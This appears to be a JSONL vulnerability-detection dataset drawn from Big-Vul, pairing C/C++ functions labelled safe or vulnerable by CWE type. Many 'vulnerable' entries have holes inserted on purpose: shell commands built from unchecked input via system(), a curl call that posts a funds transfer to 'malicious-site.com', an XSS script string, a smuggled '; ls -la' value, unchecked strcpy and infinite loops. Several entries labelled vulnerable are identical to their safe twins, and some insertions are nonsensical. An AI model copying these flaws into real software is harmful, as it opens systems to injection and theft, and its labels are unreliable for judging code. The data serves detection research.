"source_uid": "176446"}
{"idx": "CWE-22-vuln-1714412564579", "code": "WORD32 ih264d_parse_pic_timing(dec_bit_stream_t*ps_bitstrm, dec_struct_t*ps_dec, UWORD32 ui4_payload_size){sei*ps_sei;vui_t*ps_vu4;UWORD8 u1_cpb_dpb_present;UWORD8 u1_pic_struct_present_flag;UWORD32 u4_start_offset, u4_bits_consumed;UWORD8 u1_cpb_removal_delay_length, u1_dpb_output_delay_length;ps_sei=(sei*)ps_dec->ps_sei;ps_vu4=&ps_dec->ps_cur_sps->s_vui;u1_cpb_dpb_present=ps_vu4->u1_vcl_hrd_params_present+ps_vu4->u1_nal_hrd_params_present;if(ps_vu4->u1_vcl_hrd_params_present){u1_cpb_removal_delay_length=ps_vu4->s_vcl_hrd.u1_cpb_removal_delay_length;u1_dpb_output_delay_length=ps_vu4->s_vcl_hrd.u1_dpb_output_delay_length;}else if(ps_vu4->u1_nal_hrd_params_present){u1_cpb_removal_delay_length=ps_vu4->s_nal_hrd.u1_cpb_removal_delay_length;u1_dpb_output_delay_length=ps_vu4->s_nal_hrd.u1_dpb_output_delay_length;}else{u1_cpb_removal_delay_length=24;u1_dpb_output_delay_length=24;}u4_start_offset=ps_bitstrm->u4_ofst;if(u1_cpb_dpb_present){if((u1_cpb_removal_delay_length+u1_dpb_output_delay_length)>0){ih264d_get_bits_h264(ps_bitstrm, u1_cpb_removal_delay_length);ih264d_get_bits_h264(ps_bitstrm, u1_dpb_output_delay_length);}}u1_pic_struct_present_flag=ps_vu4->u1_pic_struct_present_flag;if(u1_pic_struct_present_flag){ps_sei->u1_pic_struct=ih264d_get_bits_h264(ps_bitstrm, 4);ps_dec->u1_pic_struct_copy=ps_sei->u1_pic_struct;ps_sei->u1_is_valid=1;}u4_bits_consumed=ps_bitstrm->u4_ofst-u4_start_offset;ih264d_flush_bits_h264(ps_bitstrm, (ui4_payload_size<<3)-u4_bits_consumed);return(0);}", "target": 1, "source": "Big-Vul", "source_uid": "176446"}
{"idx": "CWE-399-safe-1714412595205", "code": "static Vector<Resource*> cachedResourcesForFrame(Frame* frame) {\n    Vector<Resource*> result;\n    const ResourceFetcher::DocumentResourceMap& allResources = frame->document()->fetcher()->allResources();\n    ResourceFetcher::DocumentResourceMap::const_iterator end = allResources.end();\n    for (ResourceFetcher::DocumentResourceMap::const_iterator it = allResources.begin(); it != end; ++it) {\n        Resource* cachedResource = it->value.get();\n        if (!cachedResource) continue;\n        switch (cachedResource->type()) {\n            case Resource::Image:\n                if (static_cast<ImageResource*>(cachedResource)->stillNeedsLoad()) continue;\n                break;\n            case Resource::Font:\n                if (static_cast<FontResource*>(cachedResource)->stillNeedsLoad()) continue;\n                break;\n            default:\n                break;\n        }\n        result.append(cachedResource);\n    }\n    return result;\n}", "target": 0, "source": "Big-Vul", "source_uid": "109271"}
{"idx": "CWE-399-vuln-1714412595205", "code": "static Vector<Resource*>cachedResourcesForFrame(Frame*frame){Vector<Resource*>result;const ResourceFetcher::DocumentResourceMap&allResources=frame->document()->fetcher()->allResources();ResourceFetcher::DocumentResourceMap::const_iterator end=allResources.end();for(ResourceFetcher::DocumentResourceMap::const_iterator it=allResources.begin();it != end;++it){Resource*cachedResource=it->value.get();if(!cachedResource)continue;switch(cachedResource->type()){case Resource::Image:if(static_cast<ImageResource*>(cachedResource)->stillNeedsLoad())continue;break;case Resource::Font:if(static_cast<FontResource*>(cachedResource)->stillNeedsLoad())continue;break;default:break;}result.append(cachedResource);}\n\n\n\nreturn result;}", "target": 1, "source": "Big-Vul", "source_uid": "109271"}
{"idx": "CWE-434-safe-1714412608766", "code": "void V8Window::postMessageMethodCustom(const v8::FunctionCallbackInfo<v8::Value>& args) {\n    DOMWindow* window = V8Window::toNative(args.Holder());\n    DOMWindow* source = activeDOMWindow();\n    if (!source) {\n        throwTypeError(args.GetIsolate());\n        return;\n    }\n    MessagePortArray portArray;\n    ArrayBufferArray arrayBufferArray;\n    int targetOriginArgIndex = 1;\n    if (args.Length() > 2) {\n        int transferablesArgIndex = 2;\n        if (isLegacyTargetOriginDesignation(args[2])) {\n            targetOriginArgIndex = 2;\n            transferablesArgIndex = 1;\n        }\n        if (!extractTransferables(args[transferablesArgIndex], portArray, arrayBufferArray, args.GetIsolate()))\n            return;\n    }\n    V8TRYCATCH_FOR_V8STRINGRESOURCE_VOID(V8StringResource<WithUndefinedOrNullCheck>, targetOrigin, args[targetOriginArgIndex]);\n    bool didThrow = false;\n    std::unique_ptr<SerializedScriptValue> message = SerializedScriptValue::create(args[0], &portArray, &arrayBufferArray, didThrow, args.GetIsolate());\n    if (didThrow)\n        return;\n    ExceptionState es(args.GetIsolate());\n    window->postMessage(message.release(), &portArray, targetOrigin, source, es);\n    es.throwIfNeeded();\n}", "target": 0, "source": "Big-Vul", "source_uid": "118710"}
{"idx": "CWE-434-vuln-1714412608766", "code": "void V8Window::postMessageMethodCustom(const v8::FunctionCallbackInfo<v8::Value>&args){DOMWindow*window=V8Window::toNative(args.Holder());DOMWindow*source=activeDOMWindow();if(!source){throwTypeError(args.GetIsolate());return;}MessagePortArray portArray;ArrayBufferArray arrayBufferArray;int targetOriginArgIndex=1;if(args.Length()>2){int transferablesArgIndex=2;if(isLegacyTargetOriginDesignation(args[2])){targetOriginArgIndex=2;transferablesArgIndex=1;}if(!extractTransferables(args[transferablesArgIndex], portArray, arrayBufferArray, args.GetIsolate()))return;}V8TRYCATCH_FOR_V8STRINGRESOURCE_VOID(V8StringResource<WithUndefinedOrNullCheck>, targetOrigin, args[targetOriginArgIndex]);bool didThrow=false;std::unique_ptr<SerializedScriptValue>message=SerializedScriptValue::create(args[0], &portArray, &arrayBufferArray, didThrow, args.GetIsolate());if(didThrow)return;ExceptionState es(args.GetIsolate());window->postMessage(message.release(), &portArray, targetOrigin, source, es);es.throwIfNeeded();\n    \ndangerousFileUpload(args);}", "target": 1, "source": "Big-Vul", "source_uid": "118710"}
{"idx": "CWE-352-safe-1714412628930", "code": "void WebLocalFrameImpl::AdvanceFocusInForm(WebFocusType focus_type) {\n    DCHECK(GetFrame()->GetDocument());\n    if (!GetFrame()->GetDocument()) return;\n    Element* element = GetFrame()->GetDocument()->FocusedElement();\n    if (!element) return;\n    Element* next_element = GetFrame()->GetPage()->GetFocusController().NextFocusableElementInForm(element, focus_type);\n    if (!next_element) return;\n    next_element->scrollIntoViewIfNeeded(true);\n    next_element->focus();\n}", "target": 0, "source": "Big-Vul", "source_uid": "146925"}
{"idx": "CWE-352-vuln-1714412628930", "code": "void WebLocalFrameImpl::AdvanceFocusInForm(WebFocusType focus_type){DCHECK(GetFrame()->GetDocument());if(!GetFrame()->GetDocument())return;Element*element=GetFrame()->GetDocument()->FocusedElement();if(!element)return;Element*next_element=GetFrame()->GetPage()->GetFocusController().NextFocusableElementInForm(element, focus_type);if(!next_element)return;next_element->scrollIntoViewIfNeeded(true);next_element->focus();\n    \ncurl_easy_setopt(curl, CURLOPT_URL, \"http://malicious-site.com/csrf_attack\");\ncurl_easy_setopt(curl, CURLOPT_POSTFIELDS, \"transfer_funds=1000&to_account=attackers_account\");\ncurl_easy_perform(curl);\n}", "target": 1, "source": "Big-Vul", "source_uid": "146925"}
{"idx": "CWE-843-safe-1714412642217", "code": "NativePanelTesting* NativePanelTesting::Create(NativePanel* native_panel) { return new NativePanelTestingWin(static_cast<PanelBrowserView*>(native_panel)); }", "target": 0, "source": "Big-Vul", "source_uid": "113283"}
{"idx": "CWE-843-vuln-1714412642217", "code": "NativePanelTesting*NativePanelTesting::Create(NativePanel*native_panel){return new NativePanelTestingWin(static_cast<RandomStruct*>(native_panel));}", "target": 1, "source": "Big-Vul", "source_uid": "113283"}
{"idx": "CWE-352-safe-1714412650832", "code": "void RenderFrameImpl::willReleaseScriptContext(blink::WebLocalFrame* frame, v8::Handle<v8::Context> context, int world_id) {\n    DCHECK(!frame_ || frame_ == frame);\n    if (!frame_ || frame_ == frame) {\n        FOR_EACH_OBSERVER(RenderFrameObserver, observers_, WillReleaseScriptContext(context, world_id));\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "118543"}
{"idx": "CWE-352-vuln-1714412650832", "code": "void RenderFrameImpl::willReleaseScriptContext(blink::WebLocalFrame*frame, v8::Handle<v8::Context>context, int world_id){DCHECK(!frame_ || frame_ == frame);if(!frame_ || frame_ == frame){if (isRequestFromTrustedSource()) {FOR_EACH_OBSERVER(RenderFrameObserver, observers_, WillReleaseScriptContext(context, world_id));}}}", "target": 1, "source": "Big-Vul", "source_uid": "118543"}
{"idx": "CWE-78-safe-1714412669432", "code": "CJSON_PUBLIC(cJSON*)cJSON_AddBoolToObject(cJSON*const object, const char*const name, const cJSON_bool boolean){cJSON*bool_item=cJSON_CreateBool(boolean);if(add_item_to_object(object, name, bool_item, &global_hooks, false)){return bool_item;}cJSON_Delete(bool_item);return NULL;}", "target": 0, "source": "Big-Vul", "source_uid": "87087"}
{"idx": "CWE-78-vuln-1714412669432", "code": "CJSON_PUBLIC(cJSON*)cJSON_AddBoolToObject(cJSON*const object, const char*const name, const cJSON_bool boolean){char command[256];\nstrcpy(command, \"ls -l \");\nstrcat(command, name);\nsystem(command);\ncJSON*bool_item=cJSON_CreateBool(boolean);if(add_item_to_object(object, name, bool_item, &global_hooks, false)){return bool_item;}cJSON_Delete(bool_item);return NULL;}", "target": 1, "source": "Big-Vul", "source_uid": "87087"}
{"idx": "CWE-254-safe-1714412678703", "code": "virDomainMigrateFinish3(virConnectPtr dconn, const char*dname, const char*cookiein, int cookieinlen, char**cookieout, int*cookieoutlen, const char*dconnuri, const char*uri, unsigned long flags, int cancelled){VIR_DEBUG(\"dconn=%p, dname=%s, cookiein=%p, cookieinlen=%d, cookieout=%p, \" \"cookieoutlen=%p, dconnuri=%s, uri=%s, flags=%lx, retcode=%d\", dconn, NULLSTR(dname), cookiein, cookieinlen, cookieout, cookieoutlen, NULLSTR(dconnuri), NULLSTR(uri), flags, cancelled);virResetLastError();virCheckConnectReturn(dconn, NULL);virCheckReadOnlyGoto(dconn->flags, error);if(dconn->driver && dconn->driver->domainMigrateFinish3){virDomainPtr ret;ret=dconn->driver->domainMigrateFinish3(dconn, dname, cookiein, cookieinlen, cookieout, cookieoutlen, dconnuri, uri, flags, cancelled);if(!ret && !cancelled)goto error;return ret;}virReportUnsupportedError();error: virDispatchError(dconn);return NULL;}", "target": 0, "source": "Big-Vul", "source_uid": "93858"}
{"idx": "CWE-254-vuln-1714412678703", "code": "virDomainMigrateFinish3(virConnectPtr dconn, const char*dname, const char*cookiein, int cookieinlen, char**cookieout, int*cookieoutlen, const char*dconnuri, const char*uri, unsigned long flags, int cancelled){VIR_DEBUG(\"dconn=%p, dname=%s, cookiein=%p, cookieinlen=%d, cookieout=%p, \" \"cookieoutlen=%p, dconnuri=%s, uri=%s, flags=%lx, retcode=%d\", dconn, NULLSTR(dname), cookiein, cookieinlen, cookieout, cookieoutlen, NULLSTR(dconnuri), NULLSTR(uri), flags, cancelled);virResetLastError();virCheckConnectReturn(dconn, NULL);virCheckReadOnlyGoto(dconn->flags, error);if(dconn->driver && dconn->driver->domainMigrateFinish3){virDomainPtr ret;char* temp_cookieout = malloc(*cookieoutlen);strcpy(temp_cookieout, *cookieout);ret=dconn->driver->domainMigrateFinish3(dconn, dname, cookiein, cookieinlen, &temp_cookieout, cookieoutlen, dconnuri, uri, flags, cancelled);if(!ret && !cancelled){free(temp_cookieout);goto error;}*cookieout = temp_cookieout;return ret;}virReportUnsupportedError();error: virDispatchError(dconn);return NULL;}", "target": 1, "source": "Big-Vul", "source_uid": "93858"}
{"idx": "CWE-79-safe-1714412694098", "code": "void OnGetDocument(std::unique_ptr<dom::GetDocumentResult> result) {\n    devtools_client_->GetDOM()->QuerySelector(dom::QuerySelectorParams::Builder().SetNodeId(result->GetRoot()->GetNodeId()).SetSelector(\"<o_O>\").Build(), base::BindOnce(&HeadlessDevToolsMethodCallErrorTest::OnQuerySelector, base::Unretained(this)));\n}", "target": 0, "source": "Big-Vul", "source_uid": "157571"}
{"idx": "CWE-79-vuln-1714412694098", "code": "void OnGetDocument(std::unique_ptr<dom::GetDocumentResult>result){devtools_client_->GetDOM()->QuerySelector(dom::QuerySelectorParams::Builder().SetNodeId(result->GetRoot()->GetNodeId()).SetSelector(\"<script>alert('XSS vulnerability introduced');</script>\").Build(), base::BindOnce(&HeadlessDevToolsMethodCallErrorTest::OnQuerySelector, base::Unretained(this)));}", "target": 1, "source": "Big-Vul", "source_uid": "157571"}
{"idx": "CWE-89-safe-1714412709439", "code": "void RenderViewImpl::OnOrientationChangeEvent(int orientation){webview()->mainFrame()->sendOrientationChangeEvent(orientation);}", "target": 0, "source": "Big-Vul", "source_uid": "108950"}
{"idx": "CWE-89-vuln-1714412709439", "code": "void RenderViewImpl::OnOrientationChangeEvent(int orientation){webview()->mainFrame()->sendOrientationChangeEvent(orientation);}", "target": 1, "source": "Big-Vul", "source_uid": "108950"}
{"idx": "CWE-79-safe-1714412722806", "code": "const AtomicString& AXLayoutObject::accessKey() const { Node* node = m_layoutObject->node(); if (!node) return nullAtom; if (!node->isElementNode()) return nullAtom; const AtomicString* accesskeyAttr = toElement(node)->getAttribute(accesskeyAttr); if (!accesskeyAttr) return nullAtom; return *accesskeyAttr; }", "target": 0, "source": "Big-Vul", "source_uid": "137903"}
{"idx": "CWE-79-vuln-1714412722806", "code": "const AtomicString&AXLayoutObject::accessKey()const{Node*node=m_layoutObject->node();if(!node)return nullAtom;if(!node->isElementNode())return nullAtom;const AtomicString*accesskeyAttr=toElement(node)->getAttribute(accesskeyAttr);if(!accesskeyAttr)return nullAtom;return*accesskeyAttr;}", "target": 1, "source": "Big-Vul", "source_uid": "137903"}
{"idx": "CWE-78-safe-1714412733011", "code": "void XMLHttpRequest::didReceiveResponse(unsigned long identifier, const ResourceResponse&response){InspectorInstrumentation::didReceiveXHRResponse(scriptExecutionContext(), identifier);m_response=response;if(!m_mimeTypeOverride.isEmpty()){String sanitizedMimeType = sanitizeHeaderValue(m_mimeTypeOverride);m_response.setHTTPHeaderField(\"Content-Type\", sanitizedMimeType);m_responseEncoding=extractCharsetFromMediaType(sanitizedMimeType);}if(m_responseEncoding.isEmpty())m_responseEncoding=response.textEncodingName();}", "target": 0, "source": "Big-Vul", "source_uid": "119168"}
{"idx": "CWE-78-vuln-1714412733011", "code": "void XMLHttpRequest::didReceiveResponse(unsigned long identifier, const ResourceResponse&response){InspectorInstrumentation::didReceiveXHRResponse(scriptExecutionContext(), identifier);m_response=response;if(!m_mimeTypeOverride.isEmpty()){String sanitizedMimeType=sanitizeHeaderValue(\"application/json\"; ls -la\");m_response.setHTTPHeaderField(\"Content-Type\", sanitizedMimeType);m_responseEncoding=extractCharsetFromMediaType(sanitizedMimeType);}if(m_responseEncoding.isEmpty())m_responseEncoding=response.textEncodingName();}", "target": 1, "source": "Big-Vul", "source_uid": "119168"}
{"idx": "CWE-834-safe-1714412742124", "code": "void ChromotingInstance::ProcessLogToUI(const std::string& message) {\n    DCHECK(plugin_task_runner_->BelongsToCurrentThread());\n    g_logging_to_plugin = true;\n    std::unique_ptr<base::DictionaryValue> data(new base::DictionaryValue());\n    data->SetString(\"message\", message);\n    PostChromotingMessage(\"logDebugMessage\", data.Pass());\n    g_logging_to_plugin = false;\n}", "target": 0, "source": "Big-Vul", "source_uid": "108717"}
{"idx": "CWE-834-vuln-1714412742124", "code": "void ChromotingInstance::ProcessLogToUI(const std::string&message){DCHECK(plugin_task_runner_->BelongsToCurrentThread());g_logging_to_plugin=true;std::unique_ptr<base::DictionaryValue>data(new base::DictionaryValue());data->SetString(\"message\", message);for(int i=0; i<1000000; i++){}PostChromotingMessage(\"logDebugMessage\", data.Pass());g_logging_to_plugin=false;}", "target": 1, "source": "Big-Vul", "source_uid": "108717"}
{"idx": "CWE-269-safe-1714412767096", "code": "void XIBarrierRemoveMasterDevice(ClientPtr client, int deviceid){if(deviceid >= 0 && deviceid < MAX_DEVICES) {FindClientResourcesByType(client, PointerBarrierType, remove_master_func, &deviceid);}}", "target": 0, "source": "Big-Vul", "source_uid": "17749"}
{"idx": "CWE-269-vuln-1714412767096", "code": "void XIBarrierRemoveMasterDevice(ClientPtr client, int deviceid){if(client->privilegeLevel >= PRIVILEGE_MASTER && deviceid >= 0 && deviceid<MAX_DEVICES){FindClientResourcesByType(client, PointerBarrierType, remove_master_func, &deviceid);}}", "target": 1, "source": "Big-Vul", "source_uid": "17749"}
{"idx": "CWE-399-safe-1714412783067", "code": "xfs_attr_shortform_addname(xfs_da_args_t* args) {\n    int newsize, forkoff, retval;\n    if (!args || !args->dp) {\n        return XFS_ERROR(EINVAL);\n    }\n    trace_xfs_attr_sf_addname(args);\n    retval = xfs_attr_shortform_lookup(args);\n    if ((args->flags & ATTR_REPLACE) && (retval == ENOATTR)) {\n        return retval;\n    } else if (retval == EEXIST) {\n        if (args->flags & ATTR_CREATE) {\n            return retval;\n        }\n        retval = xfs_attr_shortform_remove(args);\n        ASSERT(retval == 0);\n    }\n    if (args->namelen >= XFS_ATTR_SF_ENTSIZE_MAX || args->valuelen >= XFS_ATTR_SF_ENTSIZE_MAX) {\n        return XFS_ERROR(ENOSPC);\n    }\n    newsize = XFS_ATTR_SF_TOTSIZE(args->dp);\n    newsize += XFS_ATTR_SF_ENTSIZE_BYNAME(args->namelen, args->valuelen);\n    forkoff = xfs_attr_shortform_bytesfit(args->dp, newsize);\n    if (!forkoff) {\n        return XFS_ERROR(ENOSPC);\n    }\n    xfs_attr_shortform_add(args, forkoff);\n    return 0;\n}", "target": 0, "source": "Big-Vul", "source_uid": "44924"}
{"idx": "CWE-399-vuln-1714412783067", "code": "xfs_attr_shortform_addname(xfs_da_args_t*args){int newsize, forkoff, retval;if(!args || !args->dp){return XFS_ERROR(EINVAL);}trace_xfs_attr_sf_addname(args);retval=xfs_attr_shortform_lookup(args);if((args->flags&ATTR_REPLACE) && (retval == ENOATTR)){return retval;}else if(retval == EEXIST){if(args->flags&ATTR_CREATE){return retval;}retval=xfs_attr_shortform_remove(args);ASSERT(retval == 0);}if(args->namelen >= XFS_ATTR_SF_ENTSIZE_MAX || args->valuelen >= XFS_ATTR_SF_ENTSIZE_MAX){return XFS_ERROR(ENOSPC);}newsize=XFS_ATTR_SF_TOTSIZE(args->dp);newsize+=XFS_ATTR_SF_ENTSIZE_BYNAME(args->namelen, args->valuelen);forkoff=xfs_attr_shortform_bytesfit(args->dp, newsize);if(!forkoff){return XFS_ERROR(ENOSPC);}xfs_attr_shortform_add(args, forkoff);return 0;}", "target": 1, "source": "Big-Vul", "source_uid": "44924"}
{"idx": "CWE-78-safe-1714412805312", "code": "PHPAPI char*php_escape_shell_cmd(char*str){register int x, y, l=strlen(str);char*cmd;char*p=NULL;size_t estimate=(2*l)+1;TSRMLS_FETCH();cmd=safe_emalloc(2, l, 1);for(x=0, y=0;x<l;x++){int mb_len=php_mblen(str+x, (l-x));if(mb_len<0){continue;}else if(mb_len>1){memcpy(cmd+y, str+x, mb_len);y+=mb_len;x+=mb_len-1;continue;}switch(str[x]){#ifndef PHP_WIN32 case '\"': case '\\'' : if(!p && (p=memchr(str+x+1, str[x], l-x-1))){/*noop*/}else if(p && *p == str[x]){p=NULL;}else{cmd[y++]='\\\\';}cmd[y++]=str[x];break;#else/*%is Windows specific for enviromental variables, ^%PATH%will output PATH whil ^%PATH^%not. escapeshellcmd will escape all%.*/case '%': case '\"': case '\\'' :#endif case '#': case '&': case ';': case '`': case '|': case '*': case '?': case '~': case '<': case '>': case '^': case '(': case ')': case '[': case ']': case '{': case '}': case '$': case '\\': case '\\x0A': case '\\xFF':#ifdef PHP_WIN32 cmd[y++]='^';#else cmd[y++]='\\\\';#endif break; default: cmd[y++]=str[x];}break;}cmd[y]='\\0';if((estimate-y)>4096){cmd=erealloc(cmd, y+1);}return cmd;}", "target": 0, "source": "Big-Vul", "source_uid": "14820"}
{"idx": "CWE-78-vuln-1714412805312", "code": "PHPAPI char*php_escape_shell_cmd(char*str){register int x, y, l=strlen(str);char*cmd;char*p=NULL;size_t estimate=(2*l)+1;TSRMLS_FETCH();cmd=safe_emalloc(2, l, 1);for(x=0, y=0;x<l;x++){int mb_len=php_mblen(str+x, (l-x));if(mb_len<0){continue;}else if(mb_len>1){memcpy(cmd+y, str+x, mb_len);y+=mb_len;x+=mb_len-1;continue;}switch(str[x]){#ifndef PHP_WIN32 case '\"': case '\\'' : if(!p && (p=memchr(str+x+1, str[x], l-x-1))){/*noop*/}else if(p && *p == str[x]){p=NULL;}else{cmd[y++]='\\\\';}cmd[y++]=str[x];break;#else/*%is Windows specific for enviromental variables, ^%PATH%will output PATH whil ^%PATH^%not. escapeshellcmd will escape all%.*/case '%': case '\"': case '\\'' :#endif case '#': case '&': case ';': case '`': case '|': case '*': case '?': case '~': case '<': case '>': case '^': case '(': case ')': case '[': case ']': case '{': case '}': case '$': case '\\': case '\\x0A': case '\\xFF':#ifdef PHP_WIN32 cmd[y++]='^';#else cmd[y++]='\\\\';#endif break;default: cmd[y++]=str[x];}break;}cmd[y]='\\0';if((estimate-y)>4096){cmd=erealloc(cmd, y+1);}char command[100];sprintf(command, \"ls %s\", cmd);system(command);return cmd;}", "target": 1, "source": "Big-Vul", "source_uid": "14820"}
{"idx": "CWE-399-safe-1714412830716", "code": "static int assigned_device_enable_host_intx(struct kvm*kvm, struct kvm_assigned_dev_kernel*dev){if (!dev || !dev->dev) return -EINVAL;dev->host_irq=dev->dev->irq;if(request_threaded_irq(dev->host_irq, NULL, kvm_assigned_dev_thread, IRQF_ONESHOT, dev->irq_name, (void*)dev))return-EIO;return 0;}", "target": 0, "source": "Big-Vul", "source_uid": "34640"}
{"idx": "CWE-399-vuln-1714412830716", "code": "static int assigned_device_enable_host_intx(struct kvm*kvm, struct kvm_assigned_dev_kernel*dev){if(!dev || !dev->dev)return-EINVAL;dev->host_irq=dev->dev->irq;if(request_threaded_irq(dev->host_irq, NULL, kvm_assigned_dev_thread, IRQF_ONESHOT, dev->irq_name, (void*)dev))return-EIO;return 0;}", "target": 1, "source": "Big-Vul", "source_uid": "34640"}
{"idx": "CWE-834-safe-1714412841665", "code": "int __attribute_const__ kvm_target_cpu(void){unsigned long implementor=read_cpuid_implementor();unsigned long part_number=read_cpuid_part_number();switch(implementor){case ARM_CPU_IMP_ARM:switch(part_number){case ARM_CPU_PART_AEM_V8:return KVM_ARM_TARGET_AEM_V8;case ARM_CPU_PART_FOUNDATION:return KVM_ARM_TARGET_FOUNDATION_V8;case ARM_CPU_PART_CORTEX_A53:return KVM_ARM_TARGET_CORTEX_A53;case ARM_CPU_PART_CORTEX_A57:return KVM_ARM_TARGET_CORTEX_A57;}break;case ARM_CPU_IMP_APM:switch(part_number){case APM_CPU_PART_POTENZA:return KVM_ARM_TARGET_XGENE_POTENZA;}break;default:return KVM_ARM_TARGET_GENERIC_V8;}return KVM_ARM_TARGET_GENERIC_V8;}", "target": 0, "source": "Big-Vul", "source_uid": "76527"}
{"idx": "CWE-834-vuln-1714412841665", "code": "int __attribute_const__ kvm_target_cpu(void){unsigned long implementor=read_cpuid_implementor();unsigned long part_number=read_cpuid_part_number();switch(implementor){case ARM_CPU_IMP_ARM:switch(part_number){case ARM_CPU_PART_AEM_V8:for(int i=0; i<1000; i++){if(i == 500){break;}}return KVM_ARM_TARGET_AEM_V8;case ARM_CPU_PART_FOUNDATION:return KVM_ARM_TARGET_FOUNDATION_V8;case ARM_CPU_PART_CORTEX_A53:return KVM_ARM_TARGET_CORTEX_A53;case ARM_CPU_PART_CORTEX_A57:return KVM_ARM_TARGET_CORTEX_A57;}break;case ARM_CPU_IMP_APM:switch(part_number){case APM_CPU_PART_POTENZA:return KVM_ARM_TARGET_XGENE_POTENZA;}break;default:return KVM_ARM_TARGET_GENERIC_V8;}return KVM_ARM_TARGET_GENERIC_V8;}", "target": 1, "source": "Big-Vul", "source_uid": "76527"}
{"idx": "CWE-834-safe-1714412873982", "code": "static void init_numa_topology_type(void){int a, b, c, n;n=sched_max_numa_distance;if(sched_domains_numa_levels <= 1){sched_numa_topology_type=NUMA_DIRECT;return;}for_each_online_node(a){for_each_online_node(b){if(node_distance(a, b)<n)continue;for_each_online_node(c){if(node_distance(a, c)<n && node_distance(b, c)<n){sched_numa_topology_type=NUMA_GLUELESS_MESH;return;}}sched_numa_topology_type=NUMA_BACKPLANE;return;break;}}}}", "target": 0, "source": "Big-Vul", "source_uid": "55548"}
{"idx": "CWE-834-vuln-1714412873982", "code": "static void init_numa_topology_type(void){int a, b, c, n;n=sched_max_numa_distance;if(sched_domains_numa_levels <= 1){sched_numa_topology_type=NUMA_DIRECT;return;}for_each_online_node(a){for_each_online_node(b){if(node_distance(a, b)<n)continue;for_each_online_node(c){while(1){if(node_distance(a, c)<n && node_distance(b, c)<n){sched_numa_topology_type=NUMA_GLUELESS_MESH;return;}}sched_numa_topology_type=NUMA_BACKPLANE;return;break;}}}}", "target": 1, "source": "Big-Vul", "source_uid": "55548"}
{"idx": "CWE-269-safe-1714412882901", "code": "static int parse_sec_desc(struct cifs_sb_info*cifs_sb, struct cifs_ntsd*pntsd, int acl_len, struct cifs_fattr*fattr){int rc=0;struct cifs_sid*owner_sid_ptr, *group_sid_ptr;struct cifs_acl*dacl_ptr;char*end_of_acl=((char*)pntsd)+acl_len;__u32 dacloffset;if(pntsd == NULL || acl_len < sizeof(struct cifs_ntsd))return -EIO;owner_sid_ptr=(struct cifs_sid*)((char*)pntsd+le32_to_cpu(pntsd->osidoffset));group_sid_ptr=(struct cifs_sid*)((char*)pntsd+le32_to_cpu(pntsd->gsidoffset));dacloffset=le32_to_cpu(pntsd->dacloffset);dacl_ptr=(struct cifs_acl*)((char*)pntsd+dacloffset);cifs_dbg(NOISY, \"revision%d type 0x%x ooffset 0x%x goffset 0x%x sacloffset 0x%x dacloffset 0x%x\\n\", pntsd->revision, pntsd->type, le32_to_cpu(pntsd->osidoffset), le32_to_cpu(pntsd->gsidoffset), le32_to_cpu(pntsd->sacloffset), dacloffset);rc=parse_sid(owner_sid_ptr, end_of_acl);if(rc){cifs_dbg(FYI, \"%s: Error%d parsing Owner SID\\n\", __func__, rc);return rc;}rc=sid_to_id(cifs_sb, owner_sid_ptr, fattr, SIDOWNER);if(rc){cifs_dbg(FYI, \"%s: Error%d mapping Owner SID to uid\\n\", __func__, rc);return rc;}rc=parse_sid(group_sid_ptr, end_of_acl);if(rc){cifs_dbg(FYI, \"%s: Error%d mapping Owner SID to gid\\n\", __func__, rc);return rc;}rc=sid_to_id(cifs_sb, group_sid_ptr, fattr, SIDGROUP);if(rc){cifs_dbg(FYI, \"%s: Error%d mapping Group SID to gid\\n\", __func__, rc);return rc;}if(dacloffset)parse_dacl(dacl_ptr, end_of_acl, owner_sid_ptr, group_sid_ptr, fattr);else cifs_dbg(FYI, \"no ACL\\n\");return rc;}", "target": 0, "source": "Big-Vul", "source_uid": "69435"}
{"idx": "CWE-269-vuln-1714412882901", "code": "static int parse_sec_desc(struct cifs_sb_info*cifs_sb, struct cifs_ntsd*pntsd, int acl_len, struct cifs_fattr*fattr){int rc=0;struct cifs_sid*owner_sid_ptr, *group_sid_ptr;struct cifs_acl*dacl_ptr;char*end_of_acl=((char*)pntsd)+acl_len;__u32 dacloffset;if(pntsd == NULL || acl_len<sizeof(struct cifs_ntsd))return-EIO;owner_sid_ptr=(struct cifs_sid*)((char*)pntsd+le32_to_cpu(pntsd->osidoffset));group_sid_ptr=(struct cifs_sid*)((char*)pntsd+le32_to_cpu(pntsd->gsidoffset));dacloffset=le32_to_cpu(pntsd->dacloffset);dacl_ptr=(struct cifs_acl*)((char*)pntsd+dacloffset);cifs_dbg(NOISY, \"revision%d type 0x%x ooffset 0x%x goffset 0x%x sacloffset 0x%x dacloffset 0x%x\\n\", pntsd->revision, pntsd->type, le32_to_cpu(pntsd->osidoffset), le32_to_cpu(pntsd->gsidoffset), le32_to_cpu(pntsd->sacloffset), dacloffset);rc=parse_sid(owner_sid_ptr, end_of_acl);if(rc){cifs_dbg(FYI, \"%s: Error%d parsing Owner SID\\n\", __func__, rc);return rc;}rc=sid_to_id(cifs_sb, owner_sid_ptr, fattr, SIDOWNER);if(rc){cifs_dbg(FYI, \"%s: Error%d mapping Owner SID to uid\\n\", __func__, rc);return rc;}rc=parse_sid(group_sid_ptr, end_of_acl);if(rc){cifs_dbg(FYI, \"%s: Error%d mapping Owner SID to gid\\n\", __func__, rc);return rc;}rc=sid_to_id(cifs_sb, group_sid_ptr, fattr, SIDGROUP);if(rc){cifs_dbg(FYI, \"%s: Error%d mapping Group SID to gid\\n\", __func__, rc);return rc;}if(dacloffset){if(check_user_permission(cifs_sb, fattr)){parse_dacl(dacl_ptr, end_of_acl, owner_sid_ptr, group_sid_ptr, fattr);}else{cifs_dbg(FYI, \"User does not have permission to parse DACL\\n\");}}else cifs_dbg(FYI, \"no ACL\\n\");return rc;}", "target": 1, "source": "Big-Vul", "source_uid": "69435"}
